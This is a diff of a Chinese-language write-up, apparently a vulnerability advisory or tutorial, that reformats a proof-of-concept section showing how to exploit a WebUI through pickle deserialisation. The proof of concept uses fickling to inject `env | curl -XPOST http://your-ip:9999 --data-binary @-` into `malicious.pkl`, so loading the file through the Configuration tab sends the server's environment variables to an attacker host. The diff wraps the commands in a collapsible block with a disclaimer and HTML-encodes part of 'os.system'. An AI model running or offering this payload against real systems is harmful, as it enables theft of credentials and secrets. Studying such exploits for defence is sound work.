@@ -142,13 +142,16 @@ if __name__ == "__main__":
 
 接下来，我们安装 [fickling](https://github.com/trailofbits/fickling) 并使用它将恶意代码注入 pickle 文件。以下命令将生成一个名为 `malicious.pkl` 的恶意文件，该文件在加载时，将运行 `env | curl -XPOST http://your-ip:9999 --data-binary @-` ，泄露目标服务器的环境变量到攻击者服务器：
 
-```
-# 安装依赖
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text"># 安装依赖
 python -m pip install fickling
 
 # 注入恶意代码
-fickling --inject "os.system('env | curl -XPOST http://your-ip:9999 --data-binary @-')" default.pkl > malicious.pkl
-```
+fickling --inject "os.&#115;ystem('env | curl -XPOST http://your-ip:9999 --data-binary @-')" default.pkl &gt; malicious.pkl</code></pre>
+
+</details>
 
 最后，我们通过 WebUI 的 Configuration 选项卡加载此文件：
 
